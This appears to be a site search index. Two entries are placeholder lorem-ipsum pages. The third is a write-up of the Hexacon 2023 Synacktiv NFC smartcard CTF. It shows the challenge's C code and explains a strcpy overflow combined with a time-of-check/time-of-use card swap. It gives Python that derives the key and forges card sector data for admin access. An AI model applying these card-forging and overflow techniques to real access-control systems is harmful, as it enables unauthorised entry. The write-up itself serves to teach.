[
  {
    "objectID": "about.html",
    "href": "about.html",
    "title": "About",
    "section": "",
    "text": "Dicta quo sed odio mollitia voluptas eveniet. Officiis eos voluptatem qui. Hic deleniti nulla quam eum mollitia qui voluptas qui. Harum pariatur eligendi necessitatibus optio consequatur facere.\nUt quaerat ut quia impedit eos voluptatum. Sunt quia deserunt consequuntur consectetur facilis qui laboriosam. Autem nobis quia dolorum consectetur ut quae itaque perspiciatis. Ea vitae asperiores eos dolorem quis nostrum.\nAutem quia aut omnis voluptatem laborum illum molestiae porro. Dignissimos quos voluptatum sit mollitia. Sint sit quo velit cumque inventore sapiente. Omnis libero quis rem nisi sed necessitatibus sit. Quam ad neque repellendus.\nInventore laudantium distinctio ab rerum vitae totam. Rerum eius porro et consequatur ipsam enim. Nisi ab rerum nihil. Hic id magnam in deleniti deleniti."
  },
  {
    "objectID": "2023/hexacon23/hexacon23.html",
    "href": "2023/hexacon23/hexacon23.html",
    "title": "Hexacon23 Synacktiv CTF",
    "section": "",
    "text": "At the 2023 edition of hexacon there were various CTF challenges, one of which organized at the venue by the event’s organizer, Synacktiv. It involved a smartcard reader attached to small computer and a screen, and a stack of smartcards. The goal of the challenge is to somehow authenticate as admin, which should pop up a specific message on the screen that shows “Waiting for NFC tag…” in Figure 1.\n\n\n\nFigure 1: CTF setup\n\n\nWe grabbed one card from the stack on the bottom left and read it out using MIFARE Classic Tool. Fortunately it used one of the standard keys included in the application. The dump showed some data in sectors 1, 2 and 3 as shown in Figure 2.\n\n\n\nFigure 2: Card contents\n\n\nThe sectors 1 and 3 contain some interesting strings as shown in Listing 1.\n\nListing 1: Data in card\n0000  68 65 78 61 63 6f 6e 5f  67 75 65 73 74 00 00 00  |hexacon_guest...|\n0010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n*\n0030  ff ff ff ff ff ff ff 07  80 69 ff ff ff ff ff ff  |.........i......|\n0040  0b 5f 6a 80 4d ad d1 4b  53 14 58 58 f2 6b 7d f0  |._j.M..KS.XX.k}.|\n0050  ba 62 dd 2f 89 44 0e 14  5c 35 2b db 00 c8 09 0a  |.b./.D..\\5+.....|\n0060  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n0070  ff ff ff ff ff ff ff 07  80 69 ff ff ff ff ff ff  |.........i......|\n0080  68 74 74 70 73 3a 2f 2f  74 69 6e 79 75 72 6c 2e  |https://tinyurl.|\n0090  63 6f 6d 2f 33 6e 76 6d  66 65 61 75 00 00 00 00  |com/3nvmfeau....|\n00a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n00b0  ff ff ff ff ff ff ff 07  80 69 ff ff ff ff ff ff  |.........i......|\n\nThe URL brings us to a zip archive containing files shown in Listing 2. This is a subset of the code running on the small computer, handling the data read from the card’s sectors.\n\nListing 2: Archive contents\n.\n├── README.md\n└─── src\n    ├── include\n    │   ├── ipc.h\n    │   ├── main.h\n    │   ├── nfc.h\n    │   └── util.h\n    ├── main.c\n    └── util.c\n\nThe README.md explains the challenge:\nDear Hexacon guest,\n\nIf you read these lines, you probably visited the Synacktiv stand \nand some ninjas might have briefed you.\n\nOtherwise, the goal is to exploit vulnerabilities inside the NFC \nreader to authenticate successfully as admin.\n\nThe sources of the challenge are available into the `src/` directory.\n\nNB: Some files such as `ipc.c` and `nfc.C` which implement some \nused functions are not part of the archive, this is intended, as \nthey are not needed to complete the challenge.\n\nHave fun ! o/\nThe main (Listing 3) of the application, initializes an admin token stored in the filesystem of the machine with get_admin_token and then enters a reading loop. When presented a card, the notify calls update messages on the screen.\n\nListing 3: main and get_admin_token functions\n#include \"main.h\"\n#include \"util.h\"\n#include \"nfc.h\"\n\nuint8_t admin_token[TOKEN_SIZE];\n\ncontext_t context;\n\nuint8_t key[KEY_SIZE];\nuint32_t iterations;\n\nint main(int argc, char *argv[]) {\n\n    // Retrieve secret\n    if (get_admin_token(admin_token)) {\n        printf(\"[-] Failed to retrieve secret\\n\");\n        notify(UNEXPECTED_FAIL);\n        return -1;\n    }\n\n    for (;;) {\n\n        iterations = 1000;\n\n        // Retrieve NFC card username\n        read_card(&context);\n\n        if (derive_key(admin_token, iterations, key) == 0) {\n            notify(UNEXPECTED_FAIL);\n            sleep(2);\n            continue;\n        }\n\n        status_t status = check_token(&context, admin_token, key);\n\n        notify(status);\n\n        if (status == VALID_TOKEN) {\n            sleep(1);\n\n            if (!strcmp(context.username, ADMIN_USERNAME)) {\n                notify(ADMIN_AUTH);\n            } else {\n                notify(GUEST_AUTH);\n            }\n\n            sleep(1);\n        }\n\n        sleep(2);\n    }\n\n    return 0;\n}\n\nint get_admin_token(char * admin_token)\n{\n    FILE * fd;\n    size_t count;\n    \n    if ((fd = fopen(\"data/admin_token.bin\", \"rb\")) == NULL) {\n        perror(\"fopen\");\n        return -1;\n    }\n\n    if ((count = fread(admin_token, 1, TOKEN_SIZE, fd)) != TOKEN_SIZE) {\n        perror(\"fread\");\n        return -1;\n    } \n\n    fclose(fd);\n\n    return 0;\n}\n\nread_card (Listing 4) moves data from the card’s sectors into the global context. This function contains the first potential vulnerability, as it uses strcpy to move the content from the third sector. This function will keep reading data from the card until a 0-byte is encountered.\n\nListing 4: read_card function\nvoid read_card(context_t *ctx)\n{\n    uint8_t sectors[SECTORS_COUNT * BLOCKS_COUNT * BLOCK_SIZE];\n\n    read_nfc_tag(sectors);\n\n    // Read username\n    strncpy(ctx-&gt;username, read_sector(sectors, 1), USERNAME_SIZE - 1);\n\n    // Read token\n    memcpy(ctx-&gt;token, read_sector(sectors, 2), TOKEN_SIZE);\n\n    // Read data\n    strcpy(ctx-&gt;data, read_sector(sectors, 3));\n}\n\nThe data field in the context structure has space for the amount of data (0x30 bytes) of sector 3. context is stored in the globals together with the admin_token, key and iterations (see Listing 3). So by overflowing the data field we can overwrite key and iterations. iterations determines the amount of hash iterations are performed in the PKCS5_PKBDF2_HMAC key derivation step in derive_key (see Listing 5).\n\nListing 5: derive_key function\nint derive_key(char * admin_token, uint32_t iterations, char * key)\n{\n    return PKCS5_PBKDF2_HMAC(\n        admin_token, // pass\n        TOKEN_SIZE, // passlen\n        NULL, // salt\n        0, // saltlen\n        iterations, // iter\n        EVP_sha256(), // digest\n        KEY_SIZE, // keylen\n        key // out\n    );\n}\n\nIf we can obtain the admin_token, we can create a card where the username is hexacon_admin and the token is admin_token. This should lead us to the authenticated admin screen.\nIn a normal run iterations is set to 1000 (see Listing 3), which is not very high for a proper key derivation system. So it could be that admin_token is some brute-forcible string that could be found in a wordlist, as the salt input is set to NULL. With the overflow we could change the amount of iterations to 1, so then just a single SHA256 hash is calculated over the password. However it is more likely that the designer of the challenge just put a random 0x20 byte string in there. In this case even bruteforcing a single 256-bit hash is not feasible.\nWe considered setting iterations to 0, so that perhaps no hash is calculated at all. This case is normaly caught by the OpenSSL implementation that was likely used, looking at the function signature. So this would not work either.\nIn the compute_token function (Listing 6), the key[] array, resulting from derive_key function, is used to perform authentication by XORing it with the SHA256 hash of the provided username, stored in sector 1 of the card.\n\nListing 6: compute_token and check_token functions\nint compute_token(context_t *ctx, char * key, char * token)\n{\n    char to_sign[USERNAME_SIZE] = {};\n\n    memcpy(to_sign, ctx-&gt;username, USERNAME_SIZE);\n\n    if (SHA256(to_sign, strlen(ctx-&gt;username), token) == NULL) {\n        return -1;\n    }\n\n    for (int i = 0; i &lt; TOKEN_SIZE; i++) {\n        token[i] ^= key[i];\n    }\n\n    return 0;\n}\n\nstatus_t check_token(context_t * ctx, uint8_t * admin_token, uint8_t * key)\n{\n    if (!strcmp(ctx-&gt;username, ADMIN_USERNAME)) {\n        // Admin authentication\n        if (memcmp(ctx-&gt;token, admin_token, TOKEN_SIZE)) {\n            return INVALID_TOKEN;\n        }\n    } else {\n        // Regular guest authentication\n        \n        // Read card with token to check authenticity\n        read_card(ctx);\n\n        uint8_t expected_token[TOKEN_SIZE] = {};\n\n        if (compute_token(ctx, key, expected_token)) {\n            return UNEXPECTED_FAIL;\n        }\n\n        #ifdef DEBUG\n        ...\n        #endif\n\n        if (memcmp(ctx-&gt;token, expected_token, TOKEN_SIZE)) {\n            return INVALID_TOKEN;\n        }\n    }\n\n    return VALID_TOKEN;\n}\n\nThe unmodified card passes the token checks as guest, as shown on the screen, so we know that the token in sector 2 matches the username in sector 3. Therefore, we can calculate the value of key by simply XORing it with the hash of the username from sector 1 as shown below.\n\nListing 7: Code to recover authentication key\ntoken = bytes.fromhex(\n    '0B5F6A804DADD14B53145858F26B7DF0BA62DD2F89440E145C352BDB00C8090A')\nkey = bytes(a ^ b for a, b in zip(token, sha256(b'hexacon_guest').digest()))\nprint(f'{key.hex()}')\n\n# '78eae65a206ad5631fc11748edeb2f84a01723b32c7b9adbe1a6311f207ea2bf' \n\nWe can now forge tokens for any username, including hexacon_admin, which should pop up the notify(ADMIN_AUTH). However, if we set username like this, the check_token function (Listing 6) will take a different path where it compares against the admin_token, which we still don’t know, and also cannot reach with the strcpy overflow.\nThen we noticed the application reads a second time from the card while in the non-admin branch of check_token, which will refill the global context structure. This means the application contains a TOCTOU type vulnerability where some checks are performed on one copy of the data, and then performs actions based on another copy of the data. Namely, the check on username to reach the right branch is performed on the first copy from the card, while the check in the main loop, which determines which final message we reach, is performed on the second read. So if we can switch the username portion of the card’s data fast enough, we can reach the right branch in check_token while setting the username to hexacon_admin and triggering the notify(ADMIN_AUTH). With something like a Proxmark or a Flipper Zero it’s probably possible to switch between card data fast enough. Alternatively, we could simply use two cards, write the different usernames with matching tokens, and switch them in between reads, if we are fast enough. However, our ninja skills were fast enough :(\nRecall the iterations variable that we could overwrite with the overflow. This determines the amount of times the pseudorandom function (HMAC in this case) is applied on the potentially weak password input in the PBKDF2_HMAC function. Setting this value really high, rather than really low, also means more computation time is needed in the application reading the cards. Furthermore, this calculation is performed between the two card reads, so this might give us enough time to manually switch between two cards.\nint main(int argc, char *argv[]) {\n    ...\n    for (;;) {\n        ...\n        // v- first card read\n        read_card(&context); \n\n        // v- PBKDF in here\n        if (derive_key(admin_token, iterations, key) == 0) { \n            ... \n        }\n        // v- second card read in here\n        status_t status = check_token(&context, admin_token, key); \n        ...\n        if (status == VALID_TOKEN) {\n            if (!strcmp(context.username, ADMIN_USERNAME)) {\n                notify(ADMIN_AUTH);\n            } else {\n                notify(GUEST_AUTH);\n            }\n        }\n    }\n}\nWe now need to set up two cards in the following way to combine both the buffer overflow and the TOCTOU bugs:\n\nOne card will contain any username string in sector 1 that is not hexacon_admin. This card needs to trigger the overflow to overwrite iterations. By doing this, it will also overwrite key[], so we need to replace the token in sector 2 such that it matches with the overwritten key[]. Due to the offsets, the last 0x10 bytes of sector 3 will end up in key[] which contain some special values. The function read_nfc_tag from nfc.h warns us that “the NFC tag A key MUST be ”FFFFFFFFFFFF””, which refers to to the light green portion of Figure 2. We just left all those bytes as they were, so we recalculated the token as shown in Listing 7, i.e. token = sha256(username) ^ key. The first 0x10 bytes of sector 4 will be the second half of the key, we just filled this with 0xff-bytes. Then the following 4 bytes of sector 4 can be used to control the iterations variable to something large like 0xffffffff.\nThe second card will contain the hexacon_admin string in the username’s sector 1. This card will need also a valid token matching the previously overwritten key[], which is generated following the same token = sha256(username) ^ key calculation.\n\nBy presenting first the guest card, and then swapping to the admin card while the PBKDF2_HMAC calculation is working, we should land on the notify(ADMIN_AUTH) page.\nThe Python script in Listing 8 generates the data for both cards’ sectors. Listing 9 shows the data for the relevant card sectors.\n\nListing 8: Code to generate the card data that exploits the vulnerabilities\nfrom hashlib import sha256\n\nkey_suffix = 'FFFFFFFFFFFFFF078069FFFFFFFFFFFF'\n\n# Calculate original key, output of pbkdf with unknown password \n# and empty salt\ntoken1 = sha256(b'hexacon_guest').digest()\ntoken2 = bytes.fromhex(\n    '0B5F6A804DADD14B53145858F26B7DF0BA62DD2F89440E145C352BDB00C8090A')\nkey = bytes(a ^ b for a, b in zip(token1, token2))\n\n# Calculate data for first card with hexacon_guest username\ntoken3 = sha256(b'hexacon_guest').digest()\nkey2 = bytes.fromhex(key_suffix) + b'\\xff'*0x10\ntoken4 = bytes(a ^ b for a, b in zip(token3, key2))\n\nprint('guest card')\n\nprint()\nprint('Sector 2 token')\nprint()\nprint(token4[:16].hex().upper())\nprint(token4[16:].hex().upper())\nprint('00'*16)\nprint(key_suffix)\nprint()\nprint('Sector 3 data')\nprint()\n\nprint((b'A'*0x10).hex().upper())\nprint((b'A'*0x10).hex().upper())\nprint((b'A'*0x10).hex().upper())\nprint(key_suffix)\nprint()\n\nprint('Sector 4 overflow')\n\nprint('FF'*16) # Second half of key\nprint('FF'*4 + '00'*12) # iterations value\nprint('00'*16)\nprint(key_suffix)\nprint()\n\nprint('admin card')\n\ntoken5 = sha256(b'hexacon_admin').digest()\nkey2 = bytes.fromhex(key_suffix) + b'\\xff'*0x10\ntoken6 = bytes(a ^ b for a, b in zip(token5, key2))\n\nprint()\nprint('Sector 1 username')\nprint()\nprint(b'hexacon_admin'.hex().upper() + '00'*3)\nprint('00'*16)\nprint('00'*16)\nprint(key_suffix)\nprint()\n\nprint('Sector 2 token')\nprint()\nprint(token6[:16].hex().upper())\nprint(token6[16:].hex().upper())\nprint('00'*16)\nprint(key_suffix)\nprint()\n\n\nListing 9: Data for both cards\nguest card\n\nSector 2 token\n\n8C4A73259238FB2FCCBCB0EFE07FAD8B\nE58A01635AC06B30426CE53BDF49544A\n00000000000000000000000000000000\nFFFFFFFFFFFFFF078069FFFFFFFFFFFF\n\nSector 3 data\n\n41414141414141414141414141414141\n41414141414141414141414141414141\n41414141414141414141414141414141\nFFFFFFFFFFFFFF078069FFFFFFFFFFFF\n\nSector 4 overflow\nFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\nFFFFFFFF000000000000000000000000\n00000000000000000000000000000000\nFFFFFFFFFFFFFF078069FFFFFFFFFFFF\n\nadmin card\n\nSector 1 username\n\n68657861636F6E5F61646D696E000000\n00000000000000000000000000000000\n00000000000000000000000000000000\nFFFFFFFFFFFFFF078069FFFFFFFFFFFF\n\nSector 2 token\n\n49B0B706DBF13385983D75887C4F1061\n78BB9677F34F57110D1584800037F513\n00000000000000000000000000000000\nFFFFFFFFFFFFFF078069FFFFFFFFFFFF\n\nEven with our slow ninja skills, we now are fast enough to see the success screen!\n\n\n\nFigure 3: Flag obtained!\n\n\nWe were not fast enough to win the first prize, but we were fast enough to win the second prize, a very cool o.mg.lol cable! Great challenge, very creative way of triggering and using a buffer overflow!\n\n\n\nFigure 4: o.mg cable"
  },
  {
    "objectID": "index.html",
    "href": "index.html",
    "title": "Home",
    "section": "",
    "text": "Dicta quo sed odio mollitia voluptas eveniet. Officiis eos voluptatem qui. Hic deleniti nulla quam eum mollitia qui voluptas qui. Harum pariatur eligendi necessitatibus optio consequatur facere.\nUt quaerat ut quia impedit eos voluptatum. Sunt quia deserunt consequuntur consectetur facilis qui laboriosam. Autem nobis quia dolorum consectetur ut quae itaque perspiciatis. Ea vitae asperiores eos dolorem quis nostrum.\nAutem quia aut omnis voluptatem laborum illum molestiae porro. Dignissimos quos voluptatum sit mollitia. Sint sit quo velit cumque inventore sapiente. Omnis libero quis rem nisi sed necessitatibus sit. Quam ad neque repellendus.\nInventore laudantium distinctio ab rerum vitae totam. Rerum eius porro et consequatur ipsam enim. Nisi ab rerum nihil. Hic id magnam in deleniti deleniti."
  }
]